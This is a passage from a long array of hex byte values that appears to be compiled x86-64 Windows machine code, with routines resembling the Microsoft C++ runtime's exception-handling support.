0x83, 0x78, 0x1, 0x0, 0x0, 0x4c, 0x8b, 0x4d, 0xd8, 0x44, 0x8b, 0x65, 0xd0, 0x4c, 0x89, 0x4c, 0x24, 0x78, 0x48, 0x8b, 0x45, 0xc8, 0x48, 0x8b, 0x0, 0x48, 0x63, 0x50, 0x10, 0x41, 0x8b, 0xc4, 0x48, 0x8d, 0xc, 0x80, 0x49, 0x8b, 0x41, 0x8, 0x4c, 0x8d, 0x4, 0x8a, 0x41, 0xf, 0x10, 0x4, 0x0, 0x49, 0x63, 0x4c, 0x0, 0x10, 0x89, 0x4d, 0xb0, 0x66, 0xf, 0x7e, 0xc0, 0xf, 0x11, 0x45, 0xa0, 0x41, 0x3b, 0xc6, 0xf, 0x8f, 0x22, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xa0, 0x48, 0xc1, 0xe8, 0x20, 0x44, 0x3b, 0xf0, 0xf, 0x8f, 0x11, 0x1, 0x0, 0x0, 0x4c, 0x8b, 0x7d, 0xa8, 0x48, 0x8b, 0xd1, 0x48, 0x3, 0x56, 0x8, 0x49, 0xc1, 0xef, 0x20, 0x48, 0x89, 0x55, 0x90, 0x45, 0x85, 0xff, 0xf, 0x84, 0xf2, 0x0, 0x0, 0x0, 0x41, 0x8b, 0xc5, 0x48, 0x8d, 0xc, 0x80, 0xf, 0x10, 0x4, 0x8a, 0xf, 0x11, 0x45, 0xf8, 0x8b, 0x44, 0x8a, 0x10, 0x89, 0x45, 0x8, 0xe8, 0x5f, 0xf5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x30, 0x48, 0x83, 0xc0, 0x4, 0x48, 0x63, 0x51, 0xc, 0x48, 0x3, 0xc2, 0x48, 0x89, 0x44, 0x24, 0x70, 0xe8, 0x46, 0xf5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x30, 0x48, 0x63, 0x51, 0xc, 0x8b, 0xc, 0x10, 0x89, 0x4c, 0x24, 0x64, 0x85, 0xc9, 0x7e, 0x3c, 0xe8, 0x2e, 0xf5, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x70, 0x4c, 0x8b, 0x43, 0x30, 0x48, 0x63, 0x9, 0x48, 0x3, 0xc1, 0x48, 0x8d, 0x4d, 0xf8, 0x48, 0x8b, 0xd0, 0x48, 0x89, 0x45, 0x88, 0xe8, 0x3b, 0x4, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x25, 0x8b, 0x44, 0x24, 0x64, 0x48, 0x83, 0x44, 0x24, 0x70, 0x4, 0xff, 0xc8, 0x89, 0x44, 0x24, 0x64, 0x85, 0xc0, 0x7f, 0xc4, 0x41, 0xff, 0xc5, 0x45, 0x3b, 0xef, 0x74, 0x62, 0x48, 0x8b, 0x55, 0x90, 0xe9, 0x6c, 0xff, 0xff, 0xff, 0x8a, 0x85, 0x98, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xce, 0x4c, 0x8b, 0x44, 0x24, 0x68, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0x55, 0x80, 0x88, 0x44, 0x24, 0x58, 0x8a, 0x44, 0x24, 0x60, 0x88, 0x44, 0x24, 0x50, 0x48, 0x8b, 0x45, 0x98, 0x48, 0x89, 0x44, 0x24, 0x48, 0x8b, 0x85, 0xa0, 0x0, 0x0, 0x0, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8d, 0x45, 0xa0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8b, 0x45, 0x88, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8d, 0x45, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x5, 0xfc, 0xff, 0xff, 0x4c, 0x8b, 0x4c, 0x24, 0x78, 0x45, 0x33, 0xed, 0x41, 0xff, 0xc4, 0x44, 0x3b, 0x65, 0xf0, 0xf, 0x82, 0x99, 0xfe, 0xff, 0xff, 0x4c, 0x8b, 0x65, 0x80, 0x8b, 0x7, 0x25, 0xff, 0xff, 0xff, 0x1f, 0x3d, 0x21, 0x5, 0x93, 0x19, 0xf, 0x82, 0xfa, 0x0, 0x0, 0x0, 0x44, 0x39, 0x6f, 0x20, 0x74, 0xe, 0xe8, 0x43, 0xf4, 0xff, 0xff, 0x48, 0x63, 0x4f, 0x20, 0x48, 0x3, 0xc1, 0x75, 0x21, 0x8b, 0x47, 0x24, 0xc1, 0xe8, 0x2, 0xa8, 0x1, 0xf, 0x84, 0xd8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xce, 0xe8, 0xf1, 0xef, 0xff, 0xff, 0x84, 0xc0, 0xf, 0x85, 0xc5, 0x0, 0x0, 0x0, 0x8b, 0x47, 0x24, 0xc1, 0xe8, 0x2, 0xa8, 0x1, 0xf, 0x85, 0xd, 0x1, 0x0, 0x0, 0x44, 0x39, 0x6f, 0x20, 0x74, 0x11, 0xe8, 0x0, 0xf4, 0xff, 0xff, 0x48, 0x8b, 0xd0, 0x48, 0x63, 0x47, 0x20, 0x48, 0x3, 0xd0, 0xeb, 0x3, 0x49, 0x8b, 0xd5, 0x48, 0x8b, 0xcb, 0xe8, 0x21, 0xc, 0x0, 0x0, 0x84, 0xc0, 0xf, 0x85, 0x8d, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x4d, 0x88, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xcc, 0xe8, 0x2f, 0xf0, 0xff, 0xff, 0x8a, 0x8d, 0x98, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc8, 0x4c, 0x8b, 0x44, 0x24, 0x68, 0x48, 0x8b, 0xd3, 0x88, 0x4c, 0x24, 0x50, 0x83, 0xc9, 0xff, 0x48, 0x89, 0x74, 0x24, 0x48, 0x4c, 0x89, 0x6c, 0x24, 0x40, 0x89, 0x4c, 0x24, 0x38, 0x89, 0x4c, 0x24, 0x30, 0x49, 0x8b, 0xcc, 0x48, 0x89, 0x7c, 0x24, 0x28, 0x4c, 0x89, 0x6c, 0x24, 0x20, 0xe8, 0xff, 0xf1, 0xff, 0xff, 0xeb, 0x3d, 0x83, 0x7f, 0xc, 0x0, 0x76, 0x37, 0x80, 0xbd, 0x98, 0x0, 0x0, 0x0, 0x0, 0xf, 0x85, 0x9d, 0x0, 0x0, 0x0, 0x8b, 0x85, 0xa0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xce, 0x4c, 0x89, 0x6c, 0x24, 0x38, 0x4d, 0x8b, 0xc7, 0x89, 0x44, 0x24, 0x30, 0x49, 0x8b, 0xd4, 0x44, 0x89, 0x74, 0x24, 0x28, 0x48, 0x8b, 0xcb, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x7c, 0x0, 0x0, 0x0, 0xe8, 0xc3, 0xec, 0xff, 0xff, 0x48, 0x83, 0x78, 0x38, 0x0, 0x75, 0x67, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0x33, 0xcc, 0xe8, 0x94, 0xa1, 0x0, 0x0, 0x48, 0x81, 0xc4, 0x28, 0x1, 0x0, 0x0, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0x5d, 0xc3, 0xb2, 0x1, 0x48, 0x8b, 0xcb, 0xe8, 0xaa, 0xe8, 0xff, 0xff, 0x48, 0x8d, 0x4d, 0xf8, 0xe8, 0x9, 0x6, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x66, 0x3d, 0x1, 0x0, 0x48, 0x8d, 0x4d, 0xf8, 0xe8, 0xad, 0xe, 0x0, 0x0, 0xcc, 0xe8, 0xa3, 0x1d, 0x0, 0x0, 0xcc, 0xe8, 0x6d, 0xec, 0xff, 0xff, 0x48, 0x89, 0x58, 0x20, 0xe8, 0x64, 0xec, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x68, 0x48, 0x89, 0x48, 0x28, 0xe8, 0x86, 0x1d, 0x0, 0x0, 0xcc, 0xe8, 0x28, 0x1e, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x20, 0x4c, 0x89, 0x40, 0x18, 0x48, 0x89, 0x50, 0x10, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xc1, 0x48, 0x81, 0xec, 0xc0, 0x0, 0x0, 0x0, 0x81, 0x39, 0x3, 0x0, 0x0, 0x80, 0x49, 0x8b, 0xf1, 0x4d, 0x8b, 0xf8, 0x4c, 0x8b, 0xf1, 0x74, 0x6e, 0xe8, 0x11, 0xec, 0xff, 0xff, 0x44, 0x8b, 0x65, 0x6f, 0x48, 0x8b, 0x7d, 0x67, 0x48, 0x83, 0x78, 0x10, 0x0, 0x74, 0x75, 0x33, 0xc9, 0xff, 0x15, 0x86, 0xb2, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0xe8, 0xf2, 0xeb, 0xff, 0xff, 0x48, 0x39, 0x58, 0x10, 0x74, 0x5f, 0x41, 0x81, 0x3e, 0x4d, 0x4f, 0x43, 0xe0, 0x74, 0x56, 0x41, 0x81, 0x3e, 0x52, 0x43, 0x43, 0xe0, 0x44, 0x8b, 0x6d, 0x77, 0x74, 0x4d, 0x48, 0x8b, 0x45, 0x7f, 0x4c, 0x8b, 0xce, 0x48, 0x8b, 0x55, 0x4f, 0x4d, 0x8b, 0xc7, 0x44, 0x89, 0x64, 0x24, 0x38, 0x49, 0x8b, 0xce, 0x48, 0x89, 0x44, 0x24, 0x30, 0x44, 0x89, 0x6c, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x60, 0xed, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x1f, 0x48, 0x8b, 0x9c, 0x24, 0x18, 0x1, 0x0, 0x0, 0x48, 0x81, 0xc4, 0xc0, 0x0, 0x0, 0x0, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0x44, 0x8b, 0x6d, 0x77, 0x48, 0x8b, 0x46, 0x8, 0x48, 0x89, 0x45, 0xaf, 0x48, 0x89, 0x7d, 0xa7, 0x83, 0x7f, 0xc, 0x0, 0xf, 0x86, 0x36, 0x1, 0x0, 0x0, 0x44, 0x89, 0x6c, 0x24, 0x28, 0x48, 0x8d, 0x55, 0xa7, 0x4c, 0x8b, 0xce, 0x48, 0x89, 0x7c, 0x24, 0x20, 0x45, 0x8b, 0xc4, 0x48, 0x8d, 0x4d, 0xdf, 0xe8, 0xe, 0xef, 0xff, 0xff, 0xf, 0x10, 0x45, 0xdf, 0xf3, 0xf, 0x7f, 0x45, 0xb7, 0x66, 0xf, 0x73, 0xd8, 0x8, 0x66, 0xf, 0x7e, 0xc0, 0x3b, 0x45, 0xf7, 0x73, 0x97, 0x4c, 0x8b, 0x4d, 0xdf, 0x44, 0x8b, 0x7d, 0xbf, 0x4c, 0x89, 0x4d, 0x47, 0x48, 0x8b, 0x45, 0xb7, 0x48, 0x8b, 0x0, 0x48, 0x63, 0x50, 0x10, 0x41, 0x8b, 0xc7, 0x48, 0x8d, 0xc, 0x80, 0x49, 0x8b, 0x41, 0x8, 0x4c, 0x8d, 0x4, 0x8a, 0x41, 0xf, 0x10, 0x4, 0x0, 0x49, 0x63, 0x4c, 0x0, 0x10, 0x89, 0x4d, 0xd7, 0x66, 0xf, 0x7e, 0xc0, 0xf, 0x11, 0x45, 0xc7, 0x41, 0x3b, 0xc4, 0xf, 0x8f, 0xa4, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xc7, 0x48, 0xc1, 0xe8, 0x20, 0x44, 0x3b, 0xe0, 0xf, 0x8f, 0x93, 0x0, 0x0, 0x0, 0x48, 0x3, 0x4e, 0x8, 0x48, 0x8b, 0x5d, 0xcf, 0x48, 0xc1, 0xeb, 0x20, 0x48, 0xff, 0xcb, 0x48, 0x8d, 0x1c, 0x9b, 0x48, 0x8d, 0x1c, 0x99, 0x83, 0x7b, 0x4, 0x0, 0x74, 0x2d, 0x4c, 0x63, 0x6b, 0x4, 0xe8, 0x50, 0xf1, 0xff, 0xff, 0x49, 0x3, 0xc5, 0x74, 0x1b, 0x45, 0x85, 0xed, 0x74, 0xe, 0xe8, 0x41, 0xf1, 0xff, 0xff, 0x48, 0x63, 0x4b, 0x4, 0x48, 0x3, 0xc1, 0xeb, 0x2, 0x33, 0xc0, 0x80, 0x78, 0x10, 0x0, 0x75, 0x4d, 0x44, 0x8b, 0x6d, 0x77, 0xf6, 0x3, 0x40, 0x75, 0x44, 0x48, 0x8b, 0x45, 0x7f, 0x4c, 0x8b, 0xce, 0x4c, 0x8b, 0x45, 0x57, 0x49, 0x8b, 0xce, 0x48, 0x8b, 0x55, 0x4f, 0xc6, 0x44, 0x24, 0x58, 0x0, 0xc6, 0x44, 0x24, 0x50, 0x1, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8d, 0x45, 0xc7, 0x44, 0x89, 0x6c, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x6f, 0xf8, 0xff, 0xff, 0x44, 0x8b, 0x6d, 0x77, 0x41, 0xff, 0xc7, 0x4c, 0x8b, 0x4d, 0x47, 0x44, 0x3b, 0x7d, 0xf7, 0xf, 0x82, 0xf, 0xff, 0xff, 0xff, 0xe9, 0x95, 0xfe, 0xff, 0xff, 0xe8, 0x10, 0x1c, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x4d, 0x8b, 0xf0, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0xf9, 0x39, 0x59, 0x4, 0xf, 0x84, 0xf0, 0x0, 0x0, 0x0, 0x48, 0x63, 0x71, 0x4, 0xe8, 0x8a, 0xf0, 0xff, 0xff, 0x4c, 0x8b, 0xc8, 0x4c, 0x3, 0xce, 0xf, 0x84, 0xdb, 0x0, 0x0, 0x0, 0x85, 0xf6, 0x74, 0xf, 0x48, 0x63, 0x77, 0x4, 0xe8, 0x71, 0xf0, 0xff, 0xff, 0x48, 0x8d, 0xc, 0x6, 0xeb, 0x5, 0x48, 0x8b, 0xcb, 0x8b, 0xf3, 0x38, 0x59, 0x10, 0xf, 0x84, 0xba, 0x0, 0x0, 0x0, 0xf6, 0x7, 0x80, 0x74, 0xa, 0xf6, 0x45, 0x0, 0x10, 0xf, 0x85, 0xab, 0x0, 0x0, 0x0, 0x85, 0xf6, 0x74, 0x11, 0xe8, 0x45, 0xf0, 0xff, 0xff, 0x48, 0x8b, 0xf0, 0x48, 0x63, 0x47, 0x4, 0x48, 0x3, 0xf0, 0xeb, 0x3, 0x48, 0x8b, 0xf3, 0xe8, 0x45, 0xf0, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0x48, 0x63, 0x45, 0x4, 0x48, 0x3, 0xc8, 0x48, 0x3b, 0xf1, 0x74, 0x4b, 0x39, 0x5f, 0x4, 0x74, 0x11, 0xe8, 0x18, 0xf0, 0xff, 0xff, 0x48, 0x8b, 0xf0, 0x48, 0x63, 0x47, 0x4, 0x48, 0x3, 0xf0, 0xeb, 0x3, 0x48, 0x8b, 0xf3, 0xe8, 0x18, 0xf0, 0xff, 0xff, 0x4c, 0x63, 0x45, 0x4, 0x49, 0x83, 0xc0, 0x10, 0x4c, 0x3, 0xc0, 0x48, 0x8d, 0x46, 0x10, 0x4c, 0x2b, 0xc0, 0xf, 0xb6, 0x8, 0x42, 0xf, 0xb6, 0x14, 0x0, 0x2b, 0xca, 0x75, 0x7, 0x48, 0xff, 0xc0, 0x85, 0xd2, 0x75, 0xed, 0x85, 0xc9, 0x74, 0x4, 0x33, 0xc0, 0xeb, 0x39, 0xb0, 0x2, 0x84, 0x45, 0x0, 0x74, 0x5, 0xf6, 0x7, 0x8, 0x74, 0x24, 0x41, 0xf6, 0x6, 0x1, 0x74, 0x5, 0xf6, 0x7, 0x1, 0x74, 0x19, 0x41, 0xf6, 0x6, 0x4, 0x74, 0x5, 0xf6, 0x7, 0x4, 0x74, 0xe, 0x41, 0x84, 0x6, 0x74, 0x4, 0x84, 0x7, 0x74, 0x5, 0xbb, 0x1, 0x0, 0x0, 0x0, 0x8b, 0xc3, 0xeb, 0x5, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xf9, 0x49, 0x8b, 0xf1, 0x49, 0x8b, 0xc8, 0x4d, 0x8b, 0xf0, 0x48, 0x8b, 0xea, 0xe8, 0x1f, 0xe8, 0xff, 0xff, 0xe8, 0xc2, 0xe8, 0xff, 0xff, 0x48, 0x8b, 0x9c, 0x24, 0x80, 0x0, 0x0, 0x0, 0xb9, 0x29, 0x0, 0x0, 0x80, 0xba, 0x26, 0x0, 0x0, 0x80, 0x83, 0x78, 0x40, 0x0, 0x75, 0x38, 0x81, 0x3f, 0x63, 0x73, 0x6d, 0xe0, 0x74, 0x30, 0x39, 0xf, 0x75, 0x10, 0x83, 0x7f, 0x18, 0xf, 0x75, 0xe, 0x48, 0x81, 0x7f, 0x60, 0x20, 0x5, 0x93, 0x19, 0xeb, 0x2, 0x39, 0x17, 0x74, 0x18, 0x8b, 0x3, 0x25, 0xff, 0xff, 0xff, 0x1f, 0x3d, 0x22, 0x5, 0x93, 0x19, 0x72, 0xa, 0xf6, 0x43, 0x24, 0x1, 0xf, 0x85, 0x8f, 0x1, 0x0, 0x0, 0xf6, 0x47, 0x4, 0x66, 0xf, 0x84, 0x8e, 0x0, 0x0, 0x0, 0x83, 0x7b, 0x4, 0x0, 0xf, 0x84, 0x7b, 0x1, 0x0, 0x0, 0x83, 0xbc, 0x24, 0x88, 0x0, 0x0, 0x0, 0x0, 0xf, 0x85, 0x6d, 0x1, 0x0, 0x0, 0xf6, 0x47, 0x4, 0x20, 0x74, 0x5d, 0x39, 0x17, 0x75, 0x37, 0x4c, 0x8b, 0x46, 0x20, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcb, 0xe8, 0x27, 0xf3, 0xff, 0xff, 0x83, 0xf8, 0xff, 0xf, 0x8c, 0x6b, 0x1, 0x0, 0x0, 0x3b, 0x43, 0x4, 0xf, 0x8d, 0x62, 0x1, 0x0, 0x0, 0x44, 0x8b, 0xc8, 0x48, 0x8b, 0xcd, 0x48, 0x8b, 0xd6, 0x4c, 0x8b, 0xc3, 0xe8, 0xb4, 0x4, 0x0, 0x0, 0xe9, 0x2c, 0x1, 0x0, 0x0, 0x39, 0xf, 0x75, 0x1e, 0x44, 0x8b, 0x4f, 0x38, 0x41, 0x83, 0xf9, 0xff, 0xf, 0x8c, 0x3a, 0x1, 0x0, 0x0, 0x44, 0x3b, 0x4b, 0x4, 0xf, 0x8d, 0x30, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x4f, 0x28, 0xeb, 0xce, 0x4c, 0x8b, 0xc3, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0x67, 0xea, 0xff, 0xff, 0xe9, 0xf7, 0x0, 0x0, 0x0, 0x83, 0x7b, 0xc, 0x0, 0x75, 0x42, 0x8b, 0x3, 0x25, 0xff, 0xff, 0xff, 0x1f, 0x3d, 0x21, 0x5, 0x93, 0x19, 0x72, 0x14, 0x83, 0x7b, 0x20, 0x0, 0x74, 0xe, 0xe8, 0x47, 0xee, 0xff, 0xff, 0x48, 0x63, 0x4b, 0x20, 0x48, 0x3, 0xc1, 0x75, 0x20, 0x8b, 0x3, 0x25, 0xff, 0xff, 0xff, 0x1f, 0x3d, 0x22, 0x5, 0x93, 0x19, 0xf, 0x82, 0xbd, 0x0, 0x0, 0x0, 0x8b, 0x43, 0x24, 0xc1, 0xe8, 0x2, 0xa8, 0x1, 0xf, 0x84, 0xaf, 0x0, 0x0, 0x0, 0x81, 0x3f, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x6e, 0x83, 0x7f, 0x18, 0x3, 0x72, 0x68, 0x81, 0x7f, 0x20, 0x22, 0x5, 0x93, 0x19, 0x76, 0x5f, 0x48, 0x8b, 0x47, 0x30, 0x83, 0x78, 0x8, 0x0, 0x74, 0x55, 0xe8, 0xc, 0xee, 0xff, 0xff, 0x4c, 0x8b, 0xd0, 0x48, 0x8b, 0x47, 0x30, 0x48, 0x63, 0x48, 0x8, 0x4c, 0x3, 0xd1, 0x74, 0x40, 0xf, 0xb6, 0x8c, 0x24, 0x98, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xce, 0x89, 0x4c, 0x24, 0x38, 0x4d, 0x8b, 0xc6, 0x48, 0x8b, 0x8c, 0x24, 0x90, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd5, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x49, 0x8b, 0xc2, 0x8b, 0x8c, 0x24, 0x88, 0x0, 0x0, 0x0, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x8b, 0xcf, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xff, 0x15, 0x12, 0xaf, 0x0, 0x0, 0xeb, 0x3e, 0x48, 0x8b, 0x84, 0x24, 0x90, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xce, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4d, 0x8b, 0xc6, 0x8b, 0x84, 0x24, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd5, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0xcf, 0x8a, 0x84, 0x24, 0x98, 0x0, 0x0, 0x0, 0x88, 0x44, 0x24, 0x28, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xe8, 0xcf, 0xf5, 0xff, 0xff, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x6c, 0x24, 0x68, 0x48, 0x8b, 0x74, 0x24, 0x70, 0x48, 0x8b, 0x7c, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x50, 0x41, 0x5e, 0xc3, 0xe8, 0x96, 0x18, 0x0, 0x0, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xc2, 0x48, 0x8d, 0xd, 0xfd, 0xbe, 0x0, 0x0, 0xf, 0x57, 0xc0, 0x48, 0x89, 0xb, 0x48, 0x8d, 0x53, 0x8, 0x48, 0x8d, 0x48, 0x8, 0xf, 0x11, 0x2, 0xe8, 0xf, 0x8, 0x0, 0x0, 0x48, 0x8d, 0x5, 0x10, 0xbf, 0x0, 0x0, 0x48, 0x89, 0x3, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x83, 0x61, 0x10, 0x0, 0x48, 0x8d, 0x5, 0x8, 0xbf, 0x0, 0x0, 0x48, 0x89, 0x41, 0x8, 0x48, 0x8d, 0x5, 0xed, 0xbe, 0x0, 0x0, 0x48, 0x89, 0x1, 0x48, 0x8b, 0xc1, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xc2, 0x48, 0x8d, 0xd, 0xa1, 0xbe, 0x0, 0x0, 0xf, 0x57, 0xc0, 0x48, 0x89, 0xb, 0x48, 0x8d, 0x53, 0x8, 0x48, 0x8d, 0x48, 0x8, 0xf, 0x11, 0x2, 0xe8, 0xb3, 0x7, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x8d, 0x5, 0x79, 0xbe, 0x0, 0x0, 0x48, 0x89, 0x1, 0x48, 0x83, 0xc1, 0x8, 0xe9, 0x25, 0x8, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x5, 0x5b, 0xbe, 0x0, 0x0, 0x48, 0x8b, 0xf9, 0x48, 0x89, 0x1, 0x8b, 0xda, 0x48, 0x83, 0xc1, 0x8, 0xe8, 0x2, 0x8, 0x0, 0x0, 0xf6, 0xc3, 0x1, 0x74, 0xd, 0xba, 0x18, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xcf, 0xe8, 0xe8, 0x9a, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0xc7, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x70, 0x48, 0x8b, 0xf9, 0x45, 0x33, 0xff, 0x44, 0x89, 0x7c, 0x24, 0x20, 0x44, 0x21, 0xbc, 0x24, 0xb0, 0x0, 0x0, 0x0, 0x4c, 0x21, 0x7c, 0x24, 0x28, 0x4c, 0x21, 0xbc, 0x24, 0xc8, 0x0, 0x0, 0x0, 0xe8, 0x9f, 0xe5, 0xff, 0xff, 0x4c, 0x8b, 0x68, 0x28, 0x4c, 0x89, 0x6c, 0x24, 0x40, 0xe8, 0x91, 0xe5, 0xff, 0xff, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x89, 0x84, 0x24, 0xc0, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x77, 0x50, 0x48, 0x89, 0xb4, 0x24, 0xb8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x47, 0x48, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0x5f, 0x40, 0x48, 0x8b, 0x47, 0x30, 0x48, 0x89, 0x44, 0x24, 0x48, 0x4c, 0x8b, 0x77, 0x28, 0x4c, 0x89, 0x74, 0x24, 0x50, 0x48, 0x8b, 0xcb, 0xe8, 0xaa, 0xe4, 0xff, 0xff, 0xe8, 0x4d, 0xe5, 0xff, 0xff, 0x48, 0x89, 0x70, 0x20, 0xe8, 0x44, 0xe5, 0xff, 0xff, 0x48, 0x89, 0x58, 0x28, 0xe8, 0x3b, 0xe5, 0xff, 0xff, 0x48, 0x8b, 0x50, 0x20, 0x48, 0x8b, 0x52, 0x28, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0xe8, 0x25, 0xeb, 0xff, 0xff, 0x4c, 0x8b, 0xe0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4c, 0x39, 0x7f, 0x58, 0x74, 0x1c, 0xc7, 0x84, 0x24, 0xb0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xe8, 0xb, 0xe5, 0xff, 0xff, 0x48, 0x8b, 0x48, 0x70, 0x48, 0x89, 0x8c, 0x24, 0xc8, 0x0, 0x0, 0x0, 0x41, 0xb8, 0x0, 0x1, 0x0, 0x0, 0x49, 0x8b, 0xd6, 0x48, 0x8b, 0x4c, 0x24, 0x48, 0xe8, 0x70, 0x5, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0xbc, 0x24, 0xc0, 0x0, 0x0, 0x0, 0xeb, 0x78, 0xc7, 0x44, 0x24, 0x20, 0x1, 0x0, 0x0, 0x0, 0xe8, 0xcd, 0xe4, 0xff, 0xff, 0x83, 0x60, 0x40, 0x0, 0x48, 0x8b, 0xb4, 0x24, 0xb8, 0x0, 0x0, 0x0, 0x83, 0xbc, 0x24, 0xb0, 0x0, 0x0, 0x0, 0x0, 0x74, 0x21, 0xb2, 0x1, 0x48, 0x8b, 0xce, 0xe8, 0xc5, 0xe0, 0xff, 0xff, 0x48, 0x8b, 0x84, 0x24, 0xc8, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x48, 0x20, 0x44, 0x8b, 0x40, 0x18, 0x8b, 0x50, 0x4, 0x8b, 0x8, 0xeb, 0xd, 0x4c, 0x8d, 0x4e, 0x20, 0x44, 0x8b, 0x46, 0x18, 0x8b, 0x56, 0x4, 0x8b, 0xe, 0xff, 0x15, 0x17, 0xab, 0x0, 0x0, 0x44, 0x8b, 0x7c, 0x24, 0x20, 0x48, 0x8b, 0x5c, 0x24, 0x28, 0x4c, 0x8b, 0x6c, 0x24, 0x40, 0x48, 0x8b, 0xbc, 0x24, 0xc0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x74, 0x24, 0x50, 0x4c, 0x8b, 0x64, 0x24, 0x38, 0x49, 0x8b, 0xcc, 0xe8, 0x92, 0xea, 0xff, 0xff, 0x45, 0x85, 0xff, 0x75, 0x32, 0x81, 0x3e, 